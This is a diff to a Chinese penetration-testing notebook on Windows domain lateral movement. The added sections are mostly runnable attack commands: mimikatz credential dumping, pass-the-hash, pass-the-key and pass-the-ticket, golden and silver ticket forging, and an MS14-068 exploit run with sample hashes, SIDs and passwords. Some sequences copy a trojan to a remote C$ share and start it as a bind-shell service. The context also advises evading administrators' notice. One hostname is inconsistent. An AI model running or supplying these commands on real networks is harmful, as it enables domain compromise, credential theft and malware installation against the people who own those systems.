@@ -17,7 +17,6 @@
 - 运维管理人员
 	内网横向攻击尽可能与运维管理人员的工作时间错开，尽量避免长时间登录administrator用户，如激活guest用户登录。降低被发现的几率。
 
-
 windwos内网横穿
 --------------------------------
 
@@ -213,24 +212,91 @@ IPC$共享利用
 
 + NTLM认证
 	- NTLM是NT LAN Manager的缩写，NTLM是基于挑战/应答的身份验证协议，是 Windows NT 早期版本中的标准安全协议，基本流程为：
-
-	::
-	
-		客户端在本地加密当前用户的密码成为密码散列
-		客户端向服务器明文发送账号
-		服务器端产生一个16位的随机数字发送给客户端，作为一个challenge
-		客户端用加密后的密码散列来加密challenge，然后返回给服务器，作为response
-		服务器端将用户名、challenge、response发送给域控制器
-		域控制器用这个用户名在SAM密码管理库中找到这个用户的密码散列，然后使用这个密码散列来加密chellenge
-		域控制器比较两次加密的challenge，如果一样那么认证成功，反之认证失败
-
+		::
+		
+			客户端在本地加密当前用户的密码成为密码散列
+			客户端向服务器明文发送账号
+			服务器端产生一个16位的随机数字发送给客户端，作为一个challenge
+			客户端用加密后的密码散列来加密challenge，然后返回给服务器，作为response
+			服务器端将用户名、challenge、response发送给域控制器
+			域控制器用这个用户名在SAM密码管理库中找到这个用户的密码散列，然后使用这个密码散列来加密chellenge
+			域控制器比较两次加密的challenge，如果一样那么认证成功，反之认证失败
 + kerboser认证
 	- 见认证机制章中Kerberos一节。
-
-+ Pass The Hash
-	- Pass The Hash (PtH) 是攻击者捕获帐号登录凭证后，复用凭证Hash进行攻击的方式。
-
-+ Pass The Key
++ PTH攻击
+	- 利用LM或NTLM的值进行的渗透测试。
+		::
+		
+			privilege::debug # 提升权限
+			sekurlsa::logonpasswords # 抓取密码
+			sekurlsa::pth /user:administrator /domain:192.168.3.32 /ntlm:518b98ad4178a53695dc997aa02d455c
+	- 如果禁用了 ntlm 认证，PsExec 无法利用获得的 ntlm hash 进行远程连接，但是使用mimikatz还是可以攻击成功。
+	- 打KB2871997补丁前任意用户都可以连接，补丁后只能administrator用户才可以连接。
++ PTK攻击
+	- 利用的 ekeys aes256 进行的渗透测试。
+		::
+		
+			sekurlsa::ekeys
+	- 利用条件：安装了KB2871997补丁；且系统禁用了NTLM的时候。
+	- 攻击示例
+		::
+		
+			privilege::debug # 提升权限
+			sekurlsa::logonpasswords # 抓取密码
+			sekurlsa::pth /user:域用户名 /domain:域名 /aes256:aes256值
+			sekurlsa::pth /user:administrator /domain:god /aes256:1811e5811877a782b6c11e2b0165ffb88d40a633f922a012372095a43d72d7ae
+			成功后会弹出一个新得cmd窗口，访问远程主机服务。
+			net use \\192.168.3.32
+			dir \\192.168.3.32\c$\
+			copy 4444.exe \\192.168.3.32\c$\  # 上传木马到目标机器中
+			sc \\192.168.3.32 create bindshell binpath= "c:\4444.exe" # 创建shell服务并绑定文件
+			sc \\192.168.3.32 start bindshell # 启动bindshell服务
++ PTT攻击
+	- 利用的票据凭证 TGT 进行的渗透测试，即利用Kerberos协议进行攻击的。
+	- 三种常见的攻击：MS14-068、Golden Ticket、SILVER ticket，简单来说就是将连接合法的票据注入到内存中实现连接。缺点：票据是有效期的，一般默认为10小时。
+	- 域控HASH伪造票据攻击
+		+ 项目地址：``https://github.com/gentilkiwi/kekeo``
+		+ 根据拿到的域控HASH，通过伪造票据进行连接
+			::
+			
+				生成票据：
+				shell kekeo "tgt::ask /user:Administrator /domain:god.org /ntlm:ccef208c6485269c20db2cad21734fe7" "exit"
+				将生成的票据文件导入内存：
+				kekeo "kerberos::ptt TGT_Administrator@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi" "exit"
+				查看导入的票据：klist
+				连接域控：dir \\owa2010cn-god\c$
+	- 缓存票据攻击
+		+ 利用历史遗留的票据重新认证尝试，成功与否看当前主机有没有被目标主机连接过。
+		+ 利用过程
+			::
+			
+				tlist查看当前票据（假设存在域管用户留下的历史票据）
+				导出票据文件：mimikatz sekurlsa::tickets /export
+				再次将票据导入到内存：
+				mimikatz kerberos::ptt TGT_Administrator@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi
+				连接目标机器：
+				net use \\owa2010cn-god\c$
+				dir \\OWA2010CN-GOD\c$
+	- 黄金票据攻击
+		+ 根据kerberos认证协议，分析只要获取Krbtgt的NTLM哈希值，就可以伪造任意的 TGT 了。
+		+ 前提：需要伪造的域管理员用户名，完整的域名，域 SID，krbtgt 的 NTLM 哈希值
+		+ 利用过程
+			::
+			
+				kerberos::golden /user:administrator /domain:whoamianony.org /sid:S-1-5-21-1315137663-3706837544-1429009142 /krbtgt:6be58bfcc0a164af2408d1d3bd313c2a /ticket:ticket.kirbi
+				即：kerberos::golden /user:需要伪造的域管理员用户名 /domain:域名 /sid:域sid /krbtgt: krbtgt用户的Hash /ticket:ticket.kirbi
+				票据导入内存：kerberos::ptt ticket.kirbi
+				访问域控：dir \\DC\c$
+	- 白银票据攻击
+		+ 伪造 TGS，通过已知的授权服务密码生成一张可以访问该服务的 TGT。
+		+ 前提：域名,域 SID,目标服务器的 FQDN,可利用的服务,服务账号的 NTLM 哈希值,要伪造的用户名 
+		+ 利用过程
+			::
+			
+				kerberos::golden /domain:whoamianony.org /sid:S-1-5-21-1315137663-3706837544-1429009142 /target:DC.whoamianony.org /rc4:6decb5d75eb5727d8535e67680b52571 /service:cifs /user:administrastor /ptt
+				kerberos::golden /domain:域名 /sid:域 SID /target:FQDN /rc4:server 机器的哈希 /service:可利用的服务 /user:要伪造的用户名 /ptt
+				直接访问域控：
+				dir \\DC.whoamianony.org\c$
 
 判断是否有域
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -329,7 +395,7 @@ IPC$共享利用
 
 获取域用户hash
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-+ :ref:`intranet/winpersistence:凭证窃取`
++ :ref:`auth/windows:Kerberos认证过程`
 
 相关漏洞
 --------------------------------
@@ -340,13 +406,28 @@ IPC$共享利用
 + MS14-068(CVE-2014-6324)
 	- Kerberos 校验和漏洞：用户在向 Kerberos 密钥分发中心（KDC）申请TGT（由票据授权服务产生的身份凭证）时，可以伪造自己的 Kerberos 票据
 	- 利用条件
-		+ 小于2012R2的域控 没有打MS14-068的补丁(KB3011780)
+		+ 小于2012R2的域控，没有打MS14-068的补丁(KB3011780)
 		+ 拿下一台加入域的计算机
 		+ 有这台域内计算机的域用户密码和Sid
 	- 利用效果：将任意域用户提升到域管权限
 	- 相关EXP
 		+ https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068
-		+ https://github.com/Al1ex/WindowsElevation
+	- 利用过程
+		::
+		
+			先获取当前机器SID
+			whoami/user
+			-u指定当前用户，-s 即SID，-p 当前用户密码，-d 域控主机ip
+			shell ms14-068.exe -u webadmin@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1132 -d 192.168.3.21 -p admin!@#45
+			执行该命令后可以看到当前目录生成了一个票据文件。
+			首先清除下票据：klist purge
+			使用mimikatz导入票据，TGT_webadmin@god.org.ccache即生成的票据文件。
+			mimikatz kerberos::ptc TGT_webadmin@god.org.ccache
+			连接域控主机，上线木马。
+			net use \\OWA2010CN-GOD\c$
+			copy 4444.exe \\OWA2010CN-GOD\c$
+			sc \\OWA2010CN-GOD create binshel1 binpath= "c:\4444.exe"
+			sc \\OWA2010-GOD start binshel1
 + CVE-2020-1472
 	- 可将域控机器用户的password设置为空
 	- 利用效果：可利用此漏洞获取域管访问权限
